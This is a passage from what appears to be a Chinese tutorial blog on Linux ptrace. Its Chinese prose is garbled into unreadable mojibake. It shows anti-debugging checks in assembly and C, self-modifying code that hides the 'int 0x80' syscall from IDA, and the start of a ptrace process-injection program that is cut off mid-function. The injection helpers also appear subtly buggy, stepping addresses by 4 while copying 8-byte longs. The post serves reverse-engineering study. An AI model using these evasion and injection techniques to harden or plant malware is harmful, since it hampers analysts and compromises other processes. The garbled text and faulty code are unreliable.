src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3240894457.png"></p><p>å†µä¸”ï¼Œå°±ç®—ptraceè°ƒç”¨éšè—çš„å†å¥½ï¼Œå¯æ‰§è¡Œç¨‹åºä¹Ÿä¼šå¯¼å…¥ç›¸åº”çš„åº“æ–‡ä»¶åŠ è½½ptrace()ï¼Œä¹Ÿä¼šæ³„éœ²å‡ºè››ä¸é©¬è¿¹ï¼</p><p><strong>åè½¬ï¼šï¼ˆé˜²ï¼‰</strong></p><p>å‰é¢å°±è¯´è¿‡ï¼Œptraceå…¶å®æ˜¯ä¸€ç§ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨å·ï¼Œä»¥åŠä¼ å…¥çš„ç›¸åº”çš„å‚æ•°ï¼Œå°±èƒ½è¶Šè¿‡åº“çš„å°è£…ï¼Œè°ƒç”¨ptraceã€‚</p><p>åœ¨x86çš„è¯­æ³•ä¸­ï¼Œâ€™int 0x80â€™æ˜¯å¯¹32ä½Linuxå¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„ä¸€ç§æ–¹æ³•ã€‚ç³»ç»Ÿè°ƒç”¨å·ç æ”¾åœ¨EAXå¯„å­˜å™¨ä¸­ï¼Œè€Œå‰6ä¸ªå‚æ•°åˆ†åˆ«æ”¾åœ¨EBXï¼ŒECXï¼ŒEDXï¼ŒESIï¼ŒEDIå’ŒEBPä¸­ã€‚é€šè¿‡æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨è¡¨æ‰¾åˆ°ptraceçš„ç³»ç»Ÿè°ƒç”¨å·</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3558141121.png"></p><p>ç¼–å†™çº¯çš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .data</span><br><span class="line">    traced: db &quot;being traced&quot;, 0xA</span><br><span class="line">    tracedLen equ $-traced</span><br><span class="line">    normal: db &quot;not being traced&quot;, 0xA</span><br><span class="line">    normalLen equ $-normal</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;calling ptrace</span><br><span class="line">    mov ebx, 0x0</span><br><span class="line">    mov ecx, 0x0</span><br><span class="line">    mov edx, 0x0</span><br><span class="line">    mov eax, 0x1a</span><br><span class="line">    int 0x80 ; sys_ptrace</span><br><span class="line">    cmp eax, 0xFFFFFFFF;æŠŠè¿”å›å€¼ä¸-1åšæ¯”è¾ƒ</span><br><span class="line">    jz debugger;eaxå€¼ä¼ª-1å°±è·³è½¬</span><br><span class="line"></span><br><span class="line">    mov edx, normalLen;æ­£å¸¸è¾“å‡º</span><br><span class="line">    mov ecx, normal;&quot;not being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">    jmp exit</span><br><span class="line"></span><br><span class="line">debugger:</span><br><span class="line">    mov edx, tracedLen;è¢«è°ƒè¯•çš„æ—¶å€™è¾“å‡º</span><br><span class="line">    mov ecx, traced ;&quot;being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80 ; sys_exit</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥å†…è”æ±‡ç¼–åˆ°cä»£ç ä¸­ï¼ˆæ­£å¸¸ç¼–è¯‘å°±å¯ä»¥ä½¿ç”¨ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">static __always_inline volatile long no_hacker()&#123;</span><br><span class="line">    int status &#x3D;0; &#x2F;&#x2F;å®šä¹‰è¿”å›å€¼å˜é‡</span><br><span class="line">        &#x2F;&#x2F;å†…è”æ±‡ç¼–ä»£ç ï¼Œç³»ç»Ÿè°ƒç”¨ptraceï¼ŒæŠŠeaxå¯„å­˜å™¨çš„å€¼èµ‹ç»™statuså˜é‡</span><br><span class="line">         __asm__ volatile(&quot;mov $0x0,%%ebx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x0,%%ecx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x0,%%edx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x1a,%%eax\n\t&quot;</span><br><span class="line">                  &quot;int $0x80\n\t&quot;</span><br><span class="line">            :&quot;&#x3D;a&quot;(status)</span><br><span class="line">            :);</span><br><span class="line">     return status;&#x2F;&#x2F;è¿™é‡ŒæŠŠç³»ç»Ÿçš„è°ƒç”¨çš„è¿”å›å€¼ä½œä¸ºno_hackeå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;    </span><br><span class="line">    if (no_hacker()&#x3D;&#x3D;-1)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace meï¼\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace meï¼\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çº¯æ±‡ç¼–ä»£ç ç¼–è¯‘è¿è¡Œï¼š</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2783546991.png"></p><p>å°è¯•gdbè°ƒè¯•</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/356951660.png"></p><p>å¯ä»¥ç”¨readelfå·¥å…·æŸ¥çœ‹ç¬¦å·è¡¨</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1033413410.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å½»åº•è„±ç¦»äº†åº“çš„èŒƒç•´ï¼Œå°†ä¸ä¼šæœ‰åº“çš„è°ƒç”¨ç‰¹å¾ï¼</p><p><strong>åè½¬:ï¼ˆæ”»ï¼‰</strong></p><p>ä½†æ˜¯ç‰›é€¼çš„idaä¾ç„¶èƒ½ç»™ä½ æ ‡æ³¨å‡ºæ¥ï¼Ÿå°±é—®ä½ éš¾å—ä¸ï¼Ÿ</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4226237960.png"></p><p>å…¶å®è¿™é‡Œç¨å¾®äººä¸ºåˆ†æä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥çš„ï¼Œç›´æ¥æŸ¥çœ‹EAXå¯„å­˜å™¨çš„å†…å®¹ï¼Œå¯¹ç…§ç³»ç»Ÿè°ƒç”¨å·è¡¨ï¼Œä¸éš¾çœ‹å‡ºè¿™æ˜¯åœ¨ç³»ç»Ÿè°ƒç”¨ptraceï¼Œä¹Ÿæœ‰è‡ªåŠ¨åŒ–å·¥å…·ï¼Œæ¯”å¦‚æœ‰å¤§ä½¬åœ¨Binary Ninjaåˆ¶ä½œäº†ä¸€ä¸ªæ’ä»¶ï¼Œè¿™ä¸ªæ’ä»¶å°±æ˜¯ä¸“é—¨æ¥æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œäº†é‚£äº›ç³»ç»Ÿè°ƒç”¨çš„ã€‚<br>githubåœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;yellowbyte.github.io&#x2F;hiding-call-to-ptrace.html</span><br></pre></td></tr></table></figure><p><strong>åè½¬ï¼š(é˜²ï¼‰</strong></p><p>å¼•ç”¨â€œSelf-Modifying Codeâ€œæŠ€æœ¯ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯äºŒè¿›åˆ¶çš„å¯æ‰§è¡Œä»£ç å¯ä»¥åœ¨è¿è¡Œæ—¶æ”¹å˜è‡ªå·±ï¼ˆä»£ç ï¼Œæ•°æ®â€¦â€¦.ï¼‰ã€‚æ„æ€æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥è®©äºŒè¿›åˆ¶ä»£ç åœ¨è¿è¡Œæ—¶å†™å…¥ç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼Œç„¶åå†æ‰§è¡Œå®ƒ,è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥éšè—int 0x80çš„ç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼Œå› ä¸ºåœ¨è¿è¡Œä¹‹å‰ï¼Œæ ¹æœ¬å°±æ²¡æœ‰æ­¤æŒ‡ä»¤,åªæœ‰æ‰§è¡Œåˆ°ç‰¹å®šçš„æŒ‡ä»¤æ—¶ï¼Œæ‰ä¼šæ˜¾ç°ï¼Œèµ·åˆ°å¾ˆå¥½çš„éšè—æ•ˆæœã€‚</p><p>è€Œåœ¨ELFæ–‡ä»¶æ ‡å¿—æ ¼å¼ä¸­ï¼Œç¨‹åºä¸­çš„ä»£ç å’Œæ•°æ®éƒ½æ˜¯ä¿å­˜åœ¨.text  sectionä¸­çš„ï¼Œä¸ºäº†ç¨‹åºçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ï¼Œ.textåœ¨é»˜è®¤ç¼–è¯‘çš„æ—¶å€™æ˜¯å¯è¯»å¯æ‰§è¡Œï¼Œä½†ä¸å¯ä»¥å†™ï¼Œæ‰€ä»¥å¿…é¡»åœ¨ä½¿ç”¨ldå·¥å…·è¿›è¡Œé“¾æ¥çš„æ—¶å€™å¾—åŠ ä¸Š-Né€‰é¡¹ã€‚</p><p>çº¯æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .data</span><br><span class="line">    traced: db &quot;being traced&quot;, 0xA</span><br><span class="line">    tracedLen equ $-traced</span><br><span class="line">    normal: db &quot;not being traced&quot;, 0xA</span><br><span class="line">    normalLen equ $-normal</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;æ˜¾ç¤ºptrace </span><br><span class="line">    mov edi, systemcall;</span><br><span class="line">    mov ax, 0x80cd;â€œ0x80cdâ€æ˜¯ä¸ç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤â€œ int 0x80â€ç›¸å¯¹åº”çš„æ“ä½œç </span><br><span class="line">    stosw;å°†AXå¯„å­˜å™¨çš„å†…å®¹å­˜å‚¨åˆ°EDIå¯„å­˜å™¨æŒ‡å‘çš„å†…å­˜ä¸­</span><br><span class="line">    ;calling ptrace</span><br><span class="line">    mov ebx, 0x0</span><br><span class="line">    mov ecx, 0x0</span><br><span class="line">    mov edx, 0x0</span><br><span class="line">    mov eax, 0x1a</span><br><span class="line">systemcall:</span><br><span class="line">    xor eax, ebx;è¿™æ¡æŒ‡ä»¤å°†è¢«int 0x80è¦†ç›–</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jl debugger</span><br><span class="line">    </span><br><span class="line">    mov edx, normalLen;æ­£å¸¸è¾“å‡º</span><br><span class="line">    mov ecx, normal;&quot;not being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">    jmp exit</span><br><span class="line">debugger:</span><br><span class="line">    mov edx, tracedLen;è¢«è°ƒè¯•çš„æ—¶å€™è¾“å‡º</span><br><span class="line">    mov ecx, traced ;&quot;being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">exit:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80 ; sys_exit</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘è¿è¡Œï¼š</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/8088311688.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2264018565499.png"></p><p>ç›´æ¥ç”¨idaæ‰“å¼€ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/237384718466.png"></p><p>å¾ˆæ˜æ˜¾ï¼Œé™æ€åˆ†æå·¥å…·idaä¹Ÿæ²¡æœ‰è¯†åˆ«å‡ºæ¥ç³»ç»Ÿè°ƒç”¨ï¼<br>é€šè¿‡readelfæŸ¥çœ‹.textæ®µçš„æƒé™ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/292593659766.png"></p><p>ç„¶åæˆ‘ä»¬ç”¨pythonä¸­çš„liefåº“è¿›è¡Œé‡å†™ï¼ŒæŠŠ.text sectionæƒé™é‡å†™å›æ¥ä¸ºAX</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/365630462666.png"></p><p>æˆ‘ä»¬æŸ¥çœ‹æ–°ä¿å­˜çš„æ–‡ä»¶new_hacker .text sectionçš„æƒé™ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3333688238.png"></p><p>ä¸€æ¬¡å¾ˆniceçš„æ¢è£…å°±æå®šäº†ï¼Œå½“ç„¶æˆ‘è¿™é‡Œåªæ˜¯é€šè¿‡çº¯æ±‡ç¼–ä»£ç éªŒè¯å¯è¡Œæ€§ï¼Œåœ¨å®é™…çš„åˆ©ç”¨åœºæ™¯ä¼—ï¼Œå†…è”æ±‡ç¼–æ’å…¥ä»£ç ï¼Œå¯èƒ½ä¼šæœ‰æ›´å¤šçš„æ··æ·†æŒ‡ä»¤ä»€ä¹ˆçš„ï¼Œè®©é€†å‘è¿‡ç¨‹æ›´ä¸ºè‰°éš¾ï¼</p><p><strong>åè½¬ï¼šï¼ˆæ”»ï¼‰</strong></p><p>è™½ç„¶é™æ€åˆ†æå·¥å…·idaå·²ç»æ— æ³•åˆ†æå‡ºç³»ç»Ÿè°ƒç”¨äº†ï¼Œä½†æ˜¯è¿™ä¾ç„¶æŒ¡ä¸ä½straceåŠ¨æ€åˆ†æï¼Œä¸€äº›æœ‰ç»éªŒçš„é€†å‘åˆ†æäººå‘˜ä¸€çœ‹åˆ°0x80cdè¿™æ ·çš„æœºå™¨ç ï¼Œå¯èƒ½æ¯”å·¥å…·åˆ†æéƒ½è¿˜è¦å¿«ï¼</p><p>è€Œä¸”å‘ç°ptraceå¹¶ä¸æ˜¯åªèƒ½ä¸“æ³¨ä¸å®ƒæœ¬èº«ï¼Œå°±æ˜¯æˆ‘ä¸€å®šè¦æ‰¾å‡ºä»€ä¹ˆptraceä»€ä¹ˆå­—ç¬¦ä¸²å•Šï¼Œä»€ä¹ˆçš„ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡ä¸€äº›å…±åŒçš„ç‰¹ç‚¹æ¥ï¼Œæ¯”å¦‚ptraceåœ¨åè°ƒè¯•ä¸­ï¼Œå¦‚æœé‡åˆ°è°ƒè¯•ï¼Œå°±ä¼šè¿”å›-1ï¼Œç¨‹åºé€€å‡ºï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è·Ÿè¿›exitç³»ç»Ÿçš„è°ƒç”¨ã€‚</p><h3 id="3-ä»£ç æ³¨å…¥"><a href="#3-ä»£ç æ³¨å…¥" class="headerlink" title="3.ä»£ç æ³¨å…¥"></a>3.ä»£ç æ³¨å…¥</h3><p>ptraceæ˜¯Unixç³»åˆ—ç³»ç»Ÿçš„ç³»ç»Ÿè°ƒç”¨ä¹‹ä¸€ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯å®ç°å¯¹è¿›ç¨‹çš„è¿½è¸ªï¼Œå¯¹ç›®æ ‡è¿›ç¨‹ï¼Œè¿›è¡Œæµç¨‹æ§åˆ¶ï¼Œç”¨æˆ·å¯„å­˜å™¨å€¼è¯»å–å’Œå†™å…¥æ“ä½œï¼Œå†…å­˜è¿›è¡Œè¯»å–å’Œä¿®æ”¹ã€‚è¿™æ ·çš„ç‰¹æ€§ï¼Œå°±éå¸¸é€‚åˆï¼Œç”¨äºç¼–å†™å®ç°ï¼Œè¿œç¨‹ä»£ç æ³¨å…¥åˆ°è¿›ç¨‹ã€‚</p><p>è€Œå¤§å¤šæ•°ç—…æ¯’ä¹Ÿæ˜¯åˆ©ç”¨åˆ°è¿™ä¸ªç‰¹æ€§ï¼Œå®ç°è‡ªç”¨ç©ºé—´æ³¨å…¥ï¼Œripä½ç½®ç›´æ¥æ³¨å…¥ï¼Œtextæ®µä¸dataæ®µä¹‹é—´çš„ç©ºéš™æ³¨å…¥ï¼Œè€Œä¸”gdbå®ç°å•æ­¥è°ƒè¯•çš„åŸç†ä¹Ÿæ˜¯åœ¨æ¯æ¡æŒ‡ä»¤åé¢æ’å…¥ä¸€ä¸ªint3ã€‚</p><p>éœ€è¦çŸ¥é“requestå‡ ä¸ªå‚æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_POKETEXT, PTRACE_POKEDATA</span><br><span class="line">å¾€å†…å­˜åœ°å€ä¸­å†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚å†…å­˜åœ°å€ç”±addrç»™å‡ºã€‚</span><br><span class="line"></span><br><span class="line">PTRACE_PEEKTEXT, PTRACE_PEEKDATA</span><br><span class="line">ä»å†…å­˜åœ°å€ä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå†…å­˜åœ°å€ç”±addrç»™å‡º</span><br><span class="line"></span><br><span class="line">PTRACE_ATTACH</span><br><span class="line">è·Ÿè¸ªæŒ‡å®špid è¿›ç¨‹</span><br><span class="line"></span><br><span class="line">PTRACE_GETREGS</span><br><span class="line">è¯»å–æ‰€æœ‰å¯„å­˜å™¨çš„å€¼</span><br><span class="line"></span><br><span class="line">PTRACE_CONT</span><br><span class="line"></span><br><span class="line">ç»§ç»­æ‰§è¡Œç¤ºè¢«è·Ÿè¸ªçš„å­è¿›ç¨‹ï¼Œsignalä¸º0åˆ™å¿½ç•¥å¼•èµ·è°ƒè¯•è¿›ç¨‹ä¸­æ­¢çš„ä¿¡å·ï¼Œè‹¥ä¸ä¸º0åˆ™ç»§ç»­å¤„ç†ä¿¡å·signalã€‚</span><br><span class="line"></span><br><span class="line">PTRACE_SETREGS</span><br><span class="line">è®¾ç½®å¯„å­˜å™¨</span><br><span class="line"></span><br><span class="line">PTRACE_DETACH</span><br><span class="line">ç»“æŸè·Ÿè¸ª</span><br></pre></td></tr></table></figure><p>ç”¨ptraceæ¥å®ç°gdbè°ƒè¯•åŸç†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;user.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;ptrace-abi.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">const int long_size &#x3D; sizeof(long);</span><br><span class="line"></span><br><span class="line">&#x2F;*ä¸»è¦é€šè¿‡PTRACE_PEEKDATAè·å–å†…å­˜ä¸­çš„å†…å®¹*&#x2F;</span><br><span class="line">void getdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *backup;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line"></span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len&#x2F;long_size;</span><br><span class="line">    backup &#x3D; str;</span><br><span class="line"></span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        data.val &#x3D; ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);</span><br><span class="line">        memcpy(backup,data.chars,long_size);</span><br><span class="line">        i++;</span><br><span class="line">        backup +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        data.val &#x3D; ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);</span><br><span class="line">        memcpy(backup, data.chars, j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*ä¸getdataç›¸åï¼Œä¸»è¦é€šè¿‡PTRACE_POKEDATAå‘å†…å­˜å†™å†…å®¹*&#x2F;</span><br><span class="line">void putdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *code;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">     &#125;data;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len &#x2F; long_size;</span><br><span class="line">    code &#x3D; str;</span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        memcpy(data.chars, code, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);&#x2F;*å‡½æ•°å†™å…¥æ˜¯ä»¥wordsä¸ºå•ä½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æˆ‘ä»¬éœ€è¦è½¬æ¢æˆwordç±»å‹ï¼Œè¿˜éœ€è¦æŒ‡é’ˆæ¯æ¬¡å¢åŠ 4ã€‚*&#x2F;</span><br><span class="line">        ++i;</span><br><span class="line">        code +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        memcpy(data.chars, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;   </span><br><span class="line">    pid_t traced_process;&#x2F;&#x2F;å®é™…å°±æ˜¯intç±»å‹</span><br><span class="line">    struct user_regs_struct regs, newregs;&#x2F;&#x2F;å®šä¹‰æ•°æ®å¯„å­˜å™¨æ•°æ®ç»“æ„çš„ä¸¤ä¸ªå˜é‡ï¼Œregsï¼Œnewregs</span><br><span class="line">    long ins;</span><br><span class="line">    &#x2F;*</span><br><span class="line">    struct user_regs_struct &#123;</span><br><span class="line">    unsigned long    r15;</span><br><span class="line">    unsigned long    r14;</span><br><span class="line">    unsigned long    r13;</span><br><span class="line">    unsigned long    r12;</span><br><span class="line">    unsigned long    bp;</span><br><span class="line">    unsigned long    bx;</span><br><span class="line">    unsigned long    r11;</span><br><span class="line">    unsigned long    r10;</span><br><span class="line">    unsigned long    r9;</span><br><span class="line">    unsigned long    r8;</span><br><span class="line">    unsigned long    ax;</span><br><span class="line">    unsigned long    cx;</span><br><span class="line">    unsigned long    dx;</span><br><span class="line">    unsigned long    si;</span><br><span class="line">    unsigned long    di;</span><br><span class="line">    unsigned long    orig_ax;</span><br><span class="line">    unsigned long    ip;</span><br><span class="line">    unsigned long    cs;</span><br><span class="line">    unsigned long    flags;</span><br><span class="line">    unsigned long    sp;</span><br><span class="line">    unsigned long    ss;</span><br><span class="line">    unsigned long    fs_base;</span><br><span class="line">    unsigned long    gs_base;</span><br><span class="line">    